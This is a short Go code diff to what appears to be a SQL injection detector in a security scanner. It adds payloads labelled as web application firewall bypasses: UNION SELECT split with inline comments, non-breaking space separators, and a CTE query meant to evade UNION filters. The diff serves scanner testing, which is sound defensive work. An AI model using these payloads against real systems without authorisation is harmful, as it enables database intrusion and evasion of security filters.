@@ -39,6 +39,18 @@ func (d *SQLiDetector) GetPayloads() []string {
 		// Error-based
 		"' AND 1=CONVERT(int, @@version)--",
 		"' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
+
+		// WAF bypass — inline SQL comments (bypasses Cloudflare, AWS WAF)
+		"' UN/**/ION SEL/**/ECT NULL--",
+		"1 UN/**/ION SEL/**/ECT NULL",
+		"' U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL--",
+
+		// WAF bypass — NBSP as whitespace separator
+		"'\xA0UNION\xA0SELECT\xA0NULL--",
+		"1\xA0UNION\xA0SELECT\xA0NULL",
+
+		// WAF bypass — CTE (WITH clause evades UNION-pattern filters)
+		"'; WITH q AS (SELECT 1) SELECT * FROM q--",
 	}
 }
 
@@ -63,6 +75,8 @@ func (d *SQLiDetector) GetContextPayloads(context PayloadContext) []string {
 			"1 AND 1=2",
 			"1 UNION SELECT NULL",
 			"1; SELECT 1",
+			"1 UN/**/ION SEL/**/ECT NULL",
+			"1\xA0UNION\xA0SELECT\xA0NULL",
 		}
 	default:
 		return []string{
